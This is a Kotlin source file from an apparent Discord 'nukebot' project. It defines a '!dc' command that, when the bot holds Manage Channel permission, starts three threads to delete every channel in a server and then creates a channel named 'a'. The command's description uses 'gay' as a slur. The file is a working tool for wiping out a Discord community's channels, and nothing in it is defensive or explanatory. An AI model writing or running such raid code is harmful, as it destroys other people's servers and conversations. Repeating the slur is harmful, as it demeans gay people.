package thenano.nukebot.bot.command.commands

import net.dv8tion.jda.api.Permission
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import net.dv8tion.jda.api.exceptions.ErrorResponseException
import thenano.nukebot.bot.command.CommandListener
import thenano.nukebot.bot.command.CommandManager

@CommandListener.Info("!dc","Delete All gay channel in this server",false)
class DeleteChannel : CommandListener() {

    override fun onEvent(event: MessageReceivedEvent) {
        if (message.contentRaw.contains("!dc")) {
            if (self.hasPermission(Permission.MANAGE_CHANNEL)) {
                for (i in 0..2) {
                    val thread = Thread(DeleteChannelThread)
                    thread.start()
                }
                guild.createTextChannel("a").complete()
            } else {
                message.reply("Permission Missing(Manage Channel)").queue()
            }
        }
    }

    object DeleteChannelThread : Runnable {
        override fun run() {
            for (channel in guild.channels) {
                try {
                    channel.delete().queue()
                } catch (e:ErrorResponseException) {
                    println("Cannot delete channel " + channel.name + " - RuntimeException")
                }
                if (CommandManager.stop) {
                    break
                }
            }
        }
    }
}